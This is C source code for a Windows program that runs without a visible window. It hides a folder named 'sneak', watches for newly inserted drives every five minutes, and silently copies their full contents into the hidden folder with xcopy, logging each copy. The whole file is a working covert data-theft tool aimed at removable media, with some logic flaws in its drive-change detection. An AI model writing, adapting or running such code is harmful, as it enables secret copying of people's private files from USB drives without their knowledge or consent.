#include <Windows.h>
#include <time.h>
#include <stdio.h>
#include <io.h>
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#pragma warning (disable : 4996)//关闭4996警告
#pragma warning (disable : 28159)
const char sys[] = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z' };

void fileA(int a,int win_A,int win_B) {
	time_t times;
	time(&times);
	FILE* fp;
	fp = fopen("log.txt", "a+");
	if (a == 2) fprintf(fp, "%s A:%d B:%d\n", ctime(&times), win_A, win_B);
	if (a == 1) fprintf(fp, "%s 初始化完成\n", ctime(&times));
	fclose(fp);
}
int main(){
	DWORD win_A = GetLogicalDrives();
	int a[26] = { 0 }, b[26] = {0};
	char str[50];
	if (!access("./sneak", 0)) {// 如果sneak文件夹存在
		if (access("./log.txt", 0)) {// 如果log.txt文件不存在，则证明初始化
			system("Attrib +h sneak");// 隐藏sneak文件
			system("cd.>log.txt");
			fileA(1, NULL, NULL);
		}
		while (1) {
			DWORD win_B = GetLogicalDrives();
			if (win_A != win_B) {
				for (int num = 0; win_A > 0; ++num) {
					a[num] = win_A % 2;
					win_A /= 2;
				}
				for (int num = 0; win_B > 0; ++num)
				{
					b[num] = win_B % 2;
					win_B /= 2;
					if (a[num] != b[num]) {
						sprintf(str, "xcopy %c: .\\sneak /e /y /d", sys[num]);
						WinExec(str, SW_HIDE);
						fileA(2, win_A, win_B);
					}
				}
			}
			Sleep(300000);//五分钟
		}
	}
	system("msg /server 127.0.0.1 * \"NO HAVE FLIE:sneak\"");
	return 0;
}
